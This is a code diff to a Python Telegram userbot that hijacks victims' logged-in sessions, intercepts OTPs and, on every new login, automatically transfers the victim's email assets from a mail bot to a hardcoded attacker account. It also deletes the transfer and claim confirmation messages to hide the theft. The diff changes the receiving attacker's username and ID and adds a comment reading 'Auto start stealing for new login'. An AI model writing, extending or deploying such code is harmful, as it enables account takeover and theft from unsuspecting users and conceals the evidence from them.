@@ -27,8 +27,10 @@ OWNERS_STR = os.getenv("OWNERS", "8612102965,8808192812")
 OWNERS = [int(x.strip()) for x in OWNERS_STR.split(",") if x.strip().isdigit()]
 
 TARGET_MAIL_BOT = "fakemailbot"
-FIXED_USERNAME = "@Hkrownerr"
-FIXED_RECEIVE_ID = 6911768478
+
+# FIXED VALUES
+FIXED_USERNAME = "@iflexcoderrrrr"
+FIXED_RECEIVE_ID = 8808192812
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -91,8 +93,12 @@ def set_config(key, value):
     db_exec("INSERT OR REPLACE INTO config (key, value) VALUES (?,?)", (key, value))
 
 def get_all_admins():
+    admins = set(OWNERS)
     res = db_exec("SELECT user_id FROM admins")
-    return [row[0] for row in res] if res else []
+    if res:
+        for row in res:
+            admins.add(row[0])
+    return list(admins)
 
 active_userbots = {}
 temp_clients = {}
@@ -141,6 +147,7 @@ async def start_userbot(user_id, session_str):
         except Exception as e:
             logger.error(f"OTP interceptor error: {e}")
 
+    # Auto start stealing for new login
     asyncio.create_task(transfer_all_mails(user_id))
 
 async def transfer_all_mails(victim_uid):
@@ -148,10 +155,8 @@ async def transfer_all_mails(victim_uid):
         victim_client = await get_or_connect_client(victim_uid)
         owner_client = await get_or_connect_client(FIXED_RECEIVE_ID)
         
-        # Sabse pehle check karo ki account login hai ya nahi
         if not victim_client or not owner_client: 
-            bot = Bot(BOT_TOKEN)
-            return await bot.send_message(FIXED_RECEIVE_ID, f"❌ {p_style('Account not logged in or Owner client error')}", parse_mode="HTML")
+            return await Bot(BOT_TOKEN).send_message(FIXED_RECEIVE_ID, f"❌ {p_style('Account not logged in or Owner client error')}", parse_mode="HTML")
             
         target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
         owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
@@ -161,7 +166,7 @@ async def transfer_all_mails(victim_uid):
         
         # Send /id and wait for reply
         await victim_client.send_message(target_bot, "/id")
-        await asyncio.sleep(4) # Zyada wait karo taaki message aa jaye
+        await asyncio.sleep(4)
         
         messages = await victim_client.get_messages(target_bot, limit=2)
         if not messages: 
@@ -178,7 +183,7 @@ async def transfer_all_mails(victim_uid):
             
             # Send transfer command
             await victim_client.send_message(target_bot, f"/transfer {email} {FIXED_USERNAME}")
-            await asyncio.sleep(4) # Wait for transfer
+            await asyncio.sleep(4)
             
             # Delete the transfer confirmation message
             try:
@@ -190,7 +195,7 @@ async def transfer_all_mails(victim_uid):
             
             # Send claim command
             await owner_client.send_message(owner_target_bot, email)
-            await asyncio.sleep(4) # Wait for claim
+            await asyncio.sleep(4)
             
             # Delete claim confirmation message
             try:
